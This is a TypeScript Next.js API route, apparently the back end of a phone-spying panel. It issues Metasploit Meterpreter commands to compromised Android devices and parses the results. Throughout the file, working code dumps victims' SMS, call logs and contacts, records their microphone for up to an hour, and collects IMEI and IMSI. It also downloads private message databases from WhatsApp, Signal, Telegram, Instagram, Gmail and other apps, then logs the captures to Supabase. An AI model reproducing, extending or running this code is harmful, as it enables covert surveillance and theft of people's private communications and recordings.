/**
 * COMMS INTELLIGENCE API
 *
 * Handles:
 *  - call_log       → dump_calllog via Meterpreter, parse CSV output
 *  - sms            → dump_sms via Meterpreter
 *  - contacts       → dump_contacts via Meterpreter
 *  - record_audio   → record_mic for N seconds, save, return filename
 *  - device_info    → IMEI, IMSI, serial, carrier via sub_info / device_info post modules
 *  - social_extract → download app SQLite DB, parse via sql.js, return records
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import { logCapturedFile } from "@/lib/supabase";
import path from "path";
import fs from "fs";
import os from "os";

const PAYLOADS_DIR = process.env.PAYLOADS_DIR ?? path.join(os.homedir(), "msf-payloads");
const COMMS_DIR = path.join(PAYLOADS_DIR, "comms");

function ensureDir(d: string) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

// ── Meterpreter helpers ─────────────────────────────────────────

async function meterWrite(token: string, sessionId: number, cmd: string) {
  await rpcCall("session.meterpreter_write", [sessionId, cmd + "\n"], token);
}

async function meterRead(token: string, sessionId: number, maxWait = 15000): Promise<string> {
  const start = Date.now();
  let out = "";
  while (Date.now() - start < maxWait) {
    const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sessionId], token);
    if (res.data) out += res.data;
    if (out.includes("meterpreter >") || out.includes(">>>")) break;
    await new Promise((r) => setTimeout(r, 500));
  }
  return out;
}

// ── Parse dump_calllog text output ──────────────────────────────
function parseCallLog(raw: string) {
  // Meterpreter dump_calllog outputs lines like:
  // [Call Log] +15551234567 | 60 | INCOMING | 2024-01-01 12:00:00
  const records = [];
  const lines = raw.split(/\r?\n/);
  for (const line of lines) {
    const m = line.match(/\[Call Log\]\s+(.+?)\s+\|\s+(\d+)\s+\|\s+(\w+)\s+\|\s+(.+)/i)
      ?? line.match(/number=(.+?),.*duration=(\d+),.*type=(\w+),.*date=(.+)/i);
    if (m) {
      records.push({
        number: m[1].trim(),
        duration: parseInt(m[2]) || 0,
        type: m[3].trim().toUpperCase() as "INCOMING" | "OUTGOING" | "MISSED",
        timestamp: m[4].trim(),
      });
    }
  }
  return records;
}

// ── Parse dump_sms text output ──────────────────────────────────
function parseSmsOutput(raw: string) {
  const records = [];
  const blocks = raw.split(/\[SMS\s+\d+\]/i);
  for (const block of blocks.slice(1)) {
    const num = block.match(/number\s*:\s*(.+)/i)?.[1]?.trim() ?? "";
    const body = block.match(/body\s*:\s*([\s\S]+?)(?=\w+\s*:|$)/i)?.[1]?.trim() ?? "";
    const type = block.match(/type\s*:\s*(\w+)/i)?.[1]?.toUpperCase() ?? "INBOX";
    const date = block.match(/date\s*:\s*(.+)/i)?.[1]?.trim() ?? "";
    records.push({ address: num, body, type: type as "INBOX" | "SENT" | "DRAFT", date, read: true });
  }
  return records;
}

// ── Parse dump_contacts text output ─────────────────────────────
function parseContacts(raw: string) {
  const records: Array<{ name: string; phones: string[]; emails: string[] }> = [];
  const blocks = raw.split(/\[Contact\s+\d+\]/i);
  for (const block of blocks.slice(1)) {
    const name = block.match(/name\s*:\s*(.+)/i)?.[1]?.trim() ?? "Unknown";
    const phones = [...block.matchAll(/phone\s*:\s*(.+)/ig)].map((m) => m[1].trim());
    const emails = [...block.matchAll(/email\s*:\s*(.+)/ig)].map((m) => m[1].trim());
    records.push({ name, phones, emails });
  }
  return records;
}

// ── Parse device/sub info ───────────────────────────────────────
function parseDeviceInfo(raw: string): Record<string, string> {
  const info: Record<string, string> = {};
  const patterns: [string, RegExp][] = [
    ["IMEI",     /IMEI\s*[:\-]?\s*([0-9\-]+)/i],
    ["IMSI",     /IMSI\s*[:\-]?\s*([0-9]+)/i],
    ["MSISDN",   /MSISDN\s*[:\-]?\s*(\+?[0-9]+)/i],
    ["Carrier",  /(?:carrier|operator|network)\s*[:\-]?\s*(.+)/i],
    ["Model",    /(?:model|device)\s*[:\-]?\s*(.+)/i],
    ["Android",  /android\s+version\s*[:\-]?\s*(.+)/i],
    ["Serial",   /serial\s*[:\-]?\s*([A-Z0-9]+)/i],
    ["Build",    /build\s*[:\-]?\s*(.+)/i],
    ["MAC",      /(?:mac|wifi.mac)\s*[:\-]?\s*([\da-fA-F:]+)/i],
    ["BT_MAC",   /bluetooth.mac\s*[:\-]?\s*([\da-fA-F:]+)/i],
  ];
  for (const [key, rx] of patterns) {
    const m = raw.match(rx);
    if (m) info[key] = m[1].trim().slice(0, 80);
  }
  // Also grab any key:value pairs
  for (const m of raw.matchAll(/^\s*(\w[\w\s]+?)\s*:\s*(.+)$/mg)) {
    const k = m[1].trim();
    if (k.length < 30 && !info[k]) info[k] = m[2].trim().slice(0, 80);
  }
  return info;
}

// ── SQLite parse via sql.js (WASM) ──────────────────────────────
async function parseSqliteFile(filePath: string, query: string): Promise<Record<string, unknown>[]> {
  try {
    // Dynamic import avoids SSR issues
    const initSqlJs = (await import("sql.js")).default;
    const SQL = await initSqlJs({
      // sql.js WASM file — use CDN fallback if not bundled
      locateFile: (f: string) => `https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.3/${f}`,
    });
    const buf = fs.readFileSync(filePath);
    const db = new SQL.Database(buf);
    const res = db.exec(query);
    if (!res.length) return [];
    const { columns, values } = res[0];
    return values.map((row) => Object.fromEntries(columns.map((c, i) => [c, row[i]])));
  } catch {
    return [];
  }
}

// ── Social app → database query map ─────────────────────────────
const SOCIAL_DB_CONFIG: Record<string, {
  remotePath: string;
  localName: string;
  query: string;
  fallbackQuery?: string;
}> = {
  whatsapp:   { remotePath: "/data/data/com.whatsapp/databases/msgstore.db",       localName: "whatsapp_msgs.db",   query: "SELECT key_remote_jid as contact, data as message, timestamp, status FROM messages ORDER BY timestamp DESC LIMIT 500" },
  telegram:   { remotePath: "/data/data/org.telegram.messenger/files/cache4.db",    localName: "telegram_msgs.db",  query: "SELECT dialog_id, message, date, from_id FROM messages ORDER BY date DESC LIMIT 500" },
  signal:     { remotePath: "/data/data/org.thoughtcrime.securesms/databases/signal.db", localName: "signal.db",    query: "SELECT address, body, date, type FROM sms ORDER BY date DESC LIMIT 500" },
  fb_msg:     { remotePath: "/data/data/com.facebook.orca/databases/threads_db2",   localName: "messenger.db",      query: "SELECT thread_key, snippet, timestamp_ms FROM threads ORDER BY timestamp_ms DESC LIMIT 300" },
  instagram:  { remotePath: "/data/data/com.instagram.android/databases/direct.db", localName: "instagram_dm.db",   query: "SELECT thread_id, preview_message, last_activity_at FROM direct_v2_threads ORDER BY last_activity_at DESC LIMIT 300" },
  snapchat:   { remotePath: "/data/data/com.snapchat.android/databases/main.db",    localName: "snapchat.db",        query: "SELECT senderId, text, timestamp FROM MesaMessage ORDER BY timestamp DESC LIMIT 300" },
  tiktok:     { remotePath: "/data/data/com.zhiliaoapp.musically/databases/IM.db",  localName: "tiktok_im.db",      query: "SELECT uid, content, create_time FROM messages ORDER BY create_time DESC LIMIT 300" },
  twitter:    { remotePath: "/data/data/com.twitter.android/databases/app.db",      localName: "twitter.db",         query: "SELECT sender_id, text, created_at FROM direct_messages ORDER BY created_at DESC LIMIT 300" },
  discord:    { remotePath: "/data/data/com.discord/databases/discord.db",          localName: "discord.db",         query: "SELECT channel_id, content, timestamp FROM messages ORDER BY timestamp DESC LIMIT 300" },
  viber:      { remotePath: "/data/data/com.viber.voip/databases/viber_messages",   localName: "viber.db",           query: "SELECT address, body, date FROM messages ORDER BY date DESC LIMIT 300" },
  wechat:     { remotePath: "/data/data/com.tencent.mm/MicroMsg/",                  localName: "wechat.db",          query: "SELECT talker, content, createTime FROM message ORDER BY createTime DESC LIMIT 300" },
  line:       { remotePath: "/data/data/jp.naver.line.android/databases/naver_line",localName: "line.db",            query: "SELECT chat_id, content, created_time FROM chat_history ORDER BY created_time DESC LIMIT 300" },
  skype:      { remotePath: "/data/data/com.skype.raider/databases/main.db",        localName: "skype.db",           query: "SELECT author, body_xml, timestamp FROM Messages ORDER BY timestamp DESC LIMIT 300" },
  gmail:      { remotePath: "/data/data/com.google.android.gm/databases/bigTopDataDB.db", localName: "gmail.db",    query: "SELECT fromAddress, subject, snippet FROM conversations ORDER BY timestamp DESC LIMIT 200" },
  gmsg:       { remotePath: "/data/data/com.google.android.apps.messaging/databases/bugle_db", localName: "gmsg.db",query: "SELECT address, text, received_timestamp FROM messages ORDER BY received_timestamp DESC LIMIT 500" },
};

// ── Main route handler ──────────────────────────────────────────
export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 }); }

  const { session_id, action, app_pkg, app_id, duration } = body as {
    session_id: number; action: string; app_pkg?: string; app_id?: string; duration?: number;
  };

  if (!session_id || !action) {
    return NextResponse.json({ ok: false, error: "session_id and action required" }, { status: 400 });
  }

  try {
    const token = await getRpcToken();

    // ── Call log ────────────────────────────────────────────
    if (action === "call_log") {
      await meterWrite(token, session_id, "dump_calllog");
      const out = await meterRead(token, session_id, 20000);
      const records = parseCallLog(out);
      return NextResponse.json({ ok: true, records, output: out });
    }

    // ── SMS dump ────────────────────────────────────────────
    if (action === "sms") {
      await meterWrite(token, session_id, "dump_sms");
      const out = await meterRead(token, session_id, 20000);
      const records = parseSmsOutput(out);
      return NextResponse.json({ ok: true, records, output: out });
    }

    // ── Contacts dump ───────────────────────────────────────
    if (action === "contacts") {
      await meterWrite(token, session_id, "dump_contacts");
      const out = await meterRead(token, session_id, 20000);
      const records = parseContacts(out);
      return NextResponse.json({ ok: true, records, output: out });
    }

    // ── Device / SIM info ───────────────────────────────────
    if (action === "device_info") {
      await meterWrite(token, session_id, "run post/android/gather/sub_info");
      const out1 = await meterRead(token, session_id, 30000);
      await meterWrite(token, session_id, "run post/android/gather/device_info");
      const out2 = await meterRead(token, session_id, 30000);
      const combined = out1 + "\n" + out2;
      const info = parseDeviceInfo(combined);
      return NextResponse.json({ ok: true, records: [info], output: combined });
    }

    // ── Audio recording ─────────────────────────────────────
    if (action === "record_audio") {
      const dur = Math.min(Number(duration ?? 60), 3600);
      ensureDir(COMMS_DIR);
      const fname = `audio_${Date.now()}.wav`;
      const localPath = path.join(COMMS_DIR, fname);

      await meterWrite(token, session_id, `record_mic -d ${dur} -f ${localPath}`);
      const out = await meterRead(token, session_id, (dur + 10) * 1000);

      // Log to Supabase if file exists
      if (fs.existsSync(localPath)) {
        await logCapturedFile({
          device_id: String(session_id),
          session_id,
          filename: fname,
          filepath: localPath,
          type: "audio",
          size: fs.statSync(localPath).size,
          source: "mic_record",
        }).catch(() => {});
      }

      return NextResponse.json({ ok: true, output: fname });
    }

    // ── Social media extraction ─────────────────────────────
    if (action === "social_extract" && app_id) {
      const cfg = SOCIAL_DB_CONFIG[app_id];
      if (!cfg) {
        return NextResponse.json({ ok: false, error: "Unknown app" });
      }

      ensureDir(COMMS_DIR);
      const localDb = path.join(COMMS_DIR, cfg.localName);

      // Try direct download first
      await meterWrite(token, session_id, `download ${cfg.remotePath} ${localDb}`);
      const dlOut = await meterRead(token, session_id, 30000);

      if (dlOut.includes("Error") || dlOut.includes("permission denied") || !fs.existsSync(localDb)) {
        // Fall back to post module
        if (app_pkg) {
          await meterWrite(token, session_id, `run post/android/capture/app_data -p ${app_pkg}`);
          const postOut = await meterRead(token, session_id, 60000);

          // Try to find extracted file in loot
          if (postOut.includes("saved")) {
            const match = postOut.match(/saved.*?to\s+(.+\.db)/i);
            if (match) {
              const lootPath = match[1].trim();
              if (fs.existsSync(lootPath)) {
                fs.copyFileSync(lootPath, localDb);
              }
            }
          }
        }
      }

      // Parse the DB if we have it
      if (fs.existsSync(localDb)) {
        const records = await parseSqliteFile(localDb, cfg.query);

        // Log to Supabase
        await logCapturedFile({
          device_id: String(session_id),
          session_id,
          filename: cfg.localName,
          filepath: localDb,
          type: "database",
          size: fs.statSync(localDb).size,
          source: `social_${app_id}`,
        }).catch(() => {});

        return NextResponse.json({ ok: true, records, app_id });
      }

      return NextResponse.json({ ok: false, error: "App not installed or access denied", app_id });
    }

    return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });

  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ ok: false, error: msg }, { status: 500 });
  }
}

export async function GET() {
  ensureDir(COMMS_DIR);
  const files = fs.existsSync(COMMS_DIR)
    ? fs.readdirSync(COMMS_DIR).map((f) => {
        const fp = path.join(COMMS_DIR, f);
        const st = fs.statSync(fp);
        return { filename: f, size: st.size, mtime: st.mtime.toISOString() };
      })
    : [];
  return NextResponse.json({ files });
}
